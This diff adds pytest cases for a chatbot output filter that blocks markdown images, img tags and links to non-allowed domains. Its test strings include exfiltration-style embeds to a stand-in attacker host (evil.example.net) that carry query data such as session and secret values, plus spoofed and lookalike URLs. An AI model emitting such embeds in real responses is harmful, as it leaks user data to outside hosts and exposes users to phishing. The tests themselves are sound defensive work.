@@ -101,3 +101,33 @@ PROMPT = ("You are a helpful customer service assistant for AcmeCorp. "
 ])
 def test_obfuscated_quote(output_filter, response, expected):
     assert output_filter.check(response)["blocked"] is expected
+
+ALLOWED = ["acmecorp.example"]
+
+@pytest.mark.parametrize("response,expected", [
+    ("![](https://evil.example.net/p.png?d=hello)", True),
+    ("![](https://evil.example.net/logo.png)", True),
+    ('<img src="https://evil.example.net/p.png">', True),
+    ("[verify](https://evil.example.net/c?session=abc)", True),
+    ("Please visit https://acmecorp.example@evil.example/login", True),
+    ("![](https://notacmecorp.example/x.png)", True),
+    ("![](http://[::1]/x.png)", True),
+    ("Open https:///evil.example/login now.", True),
+    ("![Kettle](https://acmecorp.example/img/k.png)", False),
+    ("Track it at [this page](https://help.acmecorp.example/track?order=1#top)", False),
+    ("See https://en.wikipedia.org/wiki/Limescale for details.", False),
+    ("Write to support@acmecorp.example or visit acmecorp.example.", False),
+    ("Use a path like a//b or and//or in your notes.", False),
+    ("Start the address with https:// and then your host.", False),
+])
+def test_external_links_and_embeds(output_filter, response, expected):
+    assert output_filter.check(response, allowed_domains=ALLOWED)["blocked"] is expected
+
+def test_exfil_result_does_not_echo_the_url(output_filter):
+    result = output_filter.check("![](https://evil.example.net/p.png?d=SECRETDATA)",
+                                 allowed_domains=ALLOWED)
+    assert result["rule_id"] == "exfil:embed"
+    assert "SECRETDATA" not in str(result) and "evil.example" not in str(result)
+
+def test_without_allowed_domains_even_our_own_query_links_are_blocked(output_filter):
+    assert output_filter.check("[x](https://acmecorp.example/a?b=1)")["blocked"] is True
